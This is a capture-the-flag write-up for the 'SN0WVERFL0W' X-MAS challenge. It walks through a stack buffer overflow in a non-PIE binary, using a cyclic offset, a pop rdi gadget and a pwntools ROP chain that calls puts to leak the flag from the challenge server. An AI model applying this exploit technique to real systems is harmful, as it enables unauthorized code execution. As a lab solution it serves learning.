![SN0WVERFL0W](src/SN0WVERFL0W%20.png)

first we run chacksec and files:
```shell
[marco@marco-pc challxmas]$ file chall 
chall: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=b96d5da6df4dc39b35bec7a8068b741d24999c3d, stripped
```
```gdb
pwndbg> checksec
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable  FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   No Symbols      No	0		1	/home/marco/Downloads/challxmas/chall
```

As always, the program wait for our input. Using cyclic we can find how many bytes it takes to overwrite RIP.
```gdb
pwndbg> cyclic 40
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaa
pwndbg> r
Starting program: /home/marco/Downloads/challxmas/chall 
Helloooooo, do you like to build snowmen?
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaa
Mhmmm... Boring...

Program received signal SIGSEGV, Segmentation fault.
0x0000000000401201 in ?? ()
...
RBP  0x6165616161646161 ('aadaaaea')
...
pwndbg> cyclic -l 'aada'
10
```
10 + 8 = 18 bytes. 
The file is stripped but we want to explore the memory. So the idea is executing in gdb and press ctrl+c to stop the program and explore the memory.
Searching some stuff we retive:
```gdb
pwndbg> search X-MAS
chall           0x402010 'X-MAS{REAL FLAG ON THE SERVER}'
chall           0x403010 'X-MAS{REAL FLAG ON THE SERVER}'
pwndbg> plt
0x401030: puts@plt
0x401040: read@plt
0x401050: strcmp@plt
0x401060: setvbuf@plt
```
Since there isn't PIE and we have puts in the plt, we can try to ROP and execute a puts with the flag as argument to print it.
To do that we need a gadget to pop flag address in RDI. Using ROPgadget
```shell
[marco@marco-pc challxmas]$ ROPgadget --binary="chall" > gadgets
[marco@marco-pc challxmas]$ cat gadgets | grep "pop rdi"
0x0000000000401273 : pop rdi ; ret
```


Exploit:
```python
from pwn import *


pop_rdi = 0x0000000000401273
flag1 = 0x402010
puts_plt = 0x0000000000401030
flag2 = 0x403010

payload = ("A"*18).encode()
payload += p64(pop_rdi)
payload += p64(flag1)
payload += p64(puts_plt)


s = remote('challs.xmas.htsp.ro', 12006)
s.recvuntil('?')
s.send(payload)
s.interactive()
```

# FLAG
X-MAS{700_much_5n0000w}
